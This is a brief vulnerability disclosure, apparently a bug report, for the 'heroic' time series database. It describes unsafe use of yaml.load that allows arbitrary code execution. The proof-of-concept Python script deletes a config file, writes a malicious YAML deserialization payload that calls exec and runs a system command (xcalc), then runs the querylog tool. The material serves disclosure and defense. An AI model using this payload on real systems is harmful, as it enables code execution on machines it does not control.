# Description
A scalable time series database based on Bigtable, Cassandra, and Elasticsearch

- **Vulnerability discription**
    untrusted loading of data by the yaml.load function leading to Arbitrary code execution.
# Proof of Concept

1. run exploit.py
```python
import os
#clone the repo
os.chdir('heroic/tools/')
exp ='''value: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
os.system('rm querylog_mappings.yaml')
open('querylog_mappings.yaml','w+').write(exp)
os.system('''./querylog''')
```
![](https://cdn.discordapp.com/attachments/789769803770494996/793176764670541834/unknown.png)
